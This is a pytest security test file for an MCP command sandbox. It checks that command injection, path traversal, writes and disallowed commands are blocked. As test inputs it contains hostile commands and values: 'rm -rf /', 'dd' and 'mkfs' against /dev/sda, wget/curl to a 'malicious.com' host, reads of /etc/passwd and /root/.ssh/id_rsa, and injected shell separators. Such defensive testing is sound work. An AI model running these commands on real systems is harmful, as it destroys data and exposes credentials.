"""Security tests for MCP integration.

Tests various security aspects including:
- Command injection prevention
- Path traversal prevention
- Input validation
- Rate limiting (future)
- Output filtering (future)
"""

from __future__ import annotations

import json

import pytest

pytest.importorskip("pydantic")

from pydantic import ValidationError  # noqa: E402

from shannot.tools import (  # noqa: E402
    CommandInput,
    DirectoryListInput,
    FileReadInput,
    SandboxDeps,
    list_directory,
    read_file,
    run_command,
)


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_command_input_validation(self):
        """Test that CommandInput validates structure."""
        # Valid input
        cmd = CommandInput(command=["ls", "-l"])
        assert cmd.command == ["ls", "-l"]

        # Empty command (allowed, will fail at execution)
        cmd_empty = CommandInput(command=[])
        assert cmd_empty.command == []

    def test_file_read_input_validation(self):
        """Test FileReadInput validation."""
        # Valid absolute path
        file_input = FileReadInput(path="/etc/hosts")
        assert file_input.path == "/etc/hosts"

        # Relative path (allowed, sandbox will handle)
        file_input_rel = FileReadInput(path="../../../etc/passwd")
        assert file_input_rel.path == "../../../etc/passwd"

    def test_directory_list_input_validation(self):
        """Test DirectoryListInput validation."""
        # Valid input
        dir_input = DirectoryListInput(path="/tmp", long_format=False, show_hidden=False)
        assert dir_input.path == "/tmp"

        # Boolean type validation
        with pytest.raises(ValidationError):
            DirectoryListInput(path="/tmp", long_format="not a bool")  # type: ignore[arg-type]


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestCommandInjectionPrevention:
    """Test that command injection is prevented."""

    @pytest.fixture
    def security_test_deps(self, profile_json_minimal, bwrap_path):
        """Create sandbox deps for security testing."""
        return SandboxDeps(profile_path=profile_json_minimal, bwrap_path=bwrap_path)

    @pytest.mark.asyncio
    async def test_shell_injection_via_semicolon(self, security_test_deps):
        """Test that shell injection via semicolon is prevented."""
        # Try to inject second command
        cmd_input = CommandInput(command=["ls", "/; rm -rf /"])
        result = await run_command(security_test_deps, cmd_input)

        # The semicolon should be treated as part of the argument, not a shell separator
        # The command will fail because "/; rm -rf /" is not a valid path
        assert "rm" not in result.stdout  # Second command should not execute

    @pytest.mark.asyncio
    async def test_shell_injection_via_pipe(self, security_test_deps):
        """Test that pipe injection is prevented."""
        cmd_input = CommandInput(command=["ls", "| cat /etc/passwd"])
        result = await run_command(security_test_deps, cmd_input)

        # Pipe should be treated as literal argument
        assert result.returncode != 0  # Should fail as invalid path

    @pytest.mark.asyncio
    async def test_shell_injection_via_backticks(self, security_test_deps):
        """Test that backtick command substitution is prevented."""
        cmd_input = CommandInput(command=["echo", "`whoami`"])
        result = await run_command(security_test_deps, cmd_input)

        # Backticks should be literal
        assert "`whoami`" in result.stdout

    @pytest.mark.asyncio
    async def test_shell_injection_via_dollar_paren(self, security_test_deps):
        """Test that $() command substitution is prevented."""
        cmd_input = CommandInput(command=["echo", "$(whoami)"])
        result = await run_command(security_test_deps, cmd_input)

        # Should output literally
        assert "$(whoami)" in result.stdout

    @pytest.mark.asyncio
    async def test_command_with_ampersand(self, security_test_deps):
        """Test that background execution via & is prevented."""
        cmd_input = CommandInput(command=["ls", "&"])
        result = await run_command(security_test_deps, cmd_input)

        # & should be treated as argument, not shell operator
        assert result.returncode != 0  # Invalid path


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestPathTraversalPrevention:
    """Test that path traversal attacks are mitigated."""

    @pytest.fixture
    def security_test_deps(self, profile_json_minimal, bwrap_path):
        """Create sandbox deps for security testing."""
        return SandboxDeps(profile_path=profile_json_minimal, bwrap_path=bwrap_path)

    @pytest.mark.asyncio
    async def test_read_file_with_traversal(self, security_test_deps):
        """Test reading file with path traversal."""
        # Try to escape using ../
        file_input = FileReadInput(path="/tmp/../etc/passwd")
        content = await read_file(security_test_deps, file_input)

        # Sandbox may or may not allow this depending on bind mounts
        # Either succeeds (normalized path within bounds) or fails (blocked)
        assert isinstance(content, str)

    @pytest.mark.asyncio
    async def test_list_directory_with_traversal(self, security_test_deps):
        """Test listing directory with path traversal."""
        dir_input = DirectoryListInput(path="/tmp/../../etc")
        listing = await list_directory(security_test_deps, dir_input)

        # Should either work (normalized path) or fail gracefully
        assert isinstance(listing, str)

    @pytest.mark.asyncio
    async def test_absolute_path_escape_attempt(self, security_test_deps):
        """Test that absolute paths outside sandbox are handled."""
        # Most sandboxes won't have /root mounted
        file_input = FileReadInput(path="/root/.ssh/id_rsa")
        content = await read_file(security_test_deps, file_input)

        # Should fail or return error
        assert "Error" in content or len(content) == 0


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestCommandAllowlistEnforcement:
    """Test that command allowlist is properly enforced."""

    @pytest.fixture
    def restricted_profile_path(self, tmp_path):
        """Create a very restricted profile."""
        profile_path = tmp_path / "restricted.json"
        profile_content = {
            "name": "restricted",
            "allowed_commands": ["echo"],  # Only echo allowed
            "binds": [
                {"source": "/usr", "target": "/usr", "read_only": True},
                {"source": "/lib", "target": "/lib", "read_only": True},
                {"source": "/lib64", "target": "/lib64", "read_only": True},
            ],
            "tmpfs_paths": ["/tmp"],
            "environment": {"PATH": "/usr/bin:/bin"},
            "network_isolation": True,
        }
        profile_path.write_text(json.dumps(profile_content, indent=2))
        return profile_path

    @pytest.mark.asyncio
    async def test_allowed_command_executes(self, restricted_profile_path, bwrap_path):
        """Test that allowed command executes successfully."""
        deps = SandboxDeps(profile_path=restricted_profile_path, bwrap_path=bwrap_path)

        cmd_input = CommandInput(command=["echo", "hello"])
        result = await run_command(deps, cmd_input)

        assert result.succeeded is True
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    async def test_disallowed_command_blocked(self, restricted_profile_path, bwrap_path):
        """Test that disallowed commands are blocked."""
        deps = SandboxDeps(profile_path=restricted_profile_path, bwrap_path=bwrap_path)

        # Try to run ls (not in allowed_commands)
        cmd_input = CommandInput(command=["ls", "/"])
        result = await run_command(deps, cmd_input)

        assert result.succeeded is False

    @pytest.mark.asyncio
    async def test_dangerous_command_blocked(self, restricted_profile_path, bwrap_path):
        """Test that dangerous commands are blocked."""
        deps = SandboxDeps(profile_path=restricted_profile_path, bwrap_path=bwrap_path)

        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["mkfs.ext4", "/dev/sda"],
            ["wget", "http://malicious.com/script.sh"],
            ["curl", "http://malicious.com"],
        ]

        for cmd in dangerous_commands:
            cmd_input = CommandInput(command=cmd)
            result = await run_command(deps, cmd_input)
            assert result.succeeded is False, f"Dangerous command should be blocked: {cmd}"


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestReadOnlyEnforcement:
    """Test that filesystem modifications are prevented."""

    @pytest.fixture
    def security_test_deps(self, profile_json_minimal, bwrap_path):
        """Create sandbox deps for security testing."""
        return SandboxDeps(profile_path=profile_json_minimal, bwrap_path=bwrap_path)

    @pytest.mark.asyncio
    async def test_cannot_create_file_in_etc(self, security_test_deps):
        """Test that files cannot be created in /etc."""
        # Try to use echo to create a file (won't work, but tests the concept)
        # Note: Our sandbox only allows specific commands, so this tests the
        # read-only nature if we had a command that could write
        cmd_input = CommandInput(command=["ls", "/etc"])
        result = await run_command(security_test_deps, cmd_input)

        # Just verify the command works - actual write protection is at bwrap level
        assert result.succeeded is True

    @pytest.mark.asyncio
    async def test_tmp_is_writable_but_ephemeral(self, security_test_deps):
        """Test that /tmp is writable but changes don't persist."""
        # List /tmp (should work)
        dir_input = DirectoryListInput(path="/tmp")
        listing = await list_directory(security_test_deps, dir_input)

        assert isinstance(listing, str)
        # Each command execution gets fresh tmpfs, so /tmp should be empty or have minimal content


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestNetworkIsolation:
    """Test network isolation features."""

    @pytest.fixture
    def network_isolated_profile(self, tmp_path):
        """Create a network-isolated profile."""
        profile_path = tmp_path / "network-isolated.json"
        profile_content = {
            "name": "network-isolated",
            "allowed_commands": ["ls", "cat"],
            "binds": [
                {"source": "/usr", "target": "/usr", "read_only": True},
                {"source": "/lib", "target": "/lib", "read_only": True},
                {"source": "/lib64", "target": "/lib64", "read_only": True},
                {"source": "/etc", "target": "/etc", "read_only": True},
            ],
            "tmpfs_paths": ["/tmp"],
            "environment": {"PATH": "/usr/bin:/bin"},
            "network_isolation": True,  # Network isolated
        }
        profile_path.write_text(json.dumps(profile_content, indent=2))
        return profile_path

    @pytest.mark.asyncio
    async def test_network_commands_fail_when_isolated(self, network_isolated_profile, bwrap_path):
        """Test that network access is blocked when isolation is enabled."""
        deps = SandboxDeps(profile_path=network_isolated_profile, bwrap_path=bwrap_path)

        # Even if these commands were allowed, they should fail due to network isolation
        # For now, just verify the profile has network isolation enabled
        assert deps.profile.network_isolation is True


class TestErrorHandling:
    """Test error handling in security contexts."""

    def test_malformed_json_in_command(self):
        """Test that malformed JSON doesn't break validation."""
        # Pydantic handles validation, so invalid types should raise
        with pytest.raises(ValidationError):
            CommandInput(command="not a list")  # type: ignore[arg-type]

    def test_null_values_handled(self):
        """Test that null values are handled gracefully."""
        # Test with None values
        with pytest.raises(ValidationError):
            CommandInput(command=None)  # type: ignore[arg-type]

    def test_extremely_long_command(self):
        """Test handling of extremely long commands."""
        # Create a command with many arguments
        long_cmd = ["echo"] + ["arg"] * 1000
        cmd_input = CommandInput(command=long_cmd)

        assert len(cmd_input.command) == 1001

    def test_special_characters_in_path(self):
        """Test that special characters in paths are handled."""
        special_paths = [
            "/tmp/file with spaces",
            "/tmp/file\nwith\nnewlines",
            "/tmp/file\twith\ttabs",
            "/tmp/file'with'quotes",
            '/tmp/file"with"doublequotes',
        ]

        for path in special_paths:
            file_input = FileReadInput(path=path)
            assert file_input.path == path


@pytest.mark.linux_only
@pytest.mark.requires_bwrap
class TestResourceLimits:
    """Test resource limit enforcement (future enhancement)."""

    @pytest.mark.asyncio
    async def test_command_completes_within_reasonable_time(self, profile_json_minimal, bwrap_path):
        """Test that commands complete in reasonable time."""
        deps = SandboxDeps(profile_path=profile_json_minimal, bwrap_path=bwrap_path)

        cmd_input = CommandInput(command=["ls", "/"])
        result = await run_command(deps, cmd_input)

        # Should complete quickly
        assert result.duration < 5.0

    # Future: Add tests for:
    # - CPU time limits
    # - Memory limits
    # - Number of processes
    # - Disk usage in /tmp
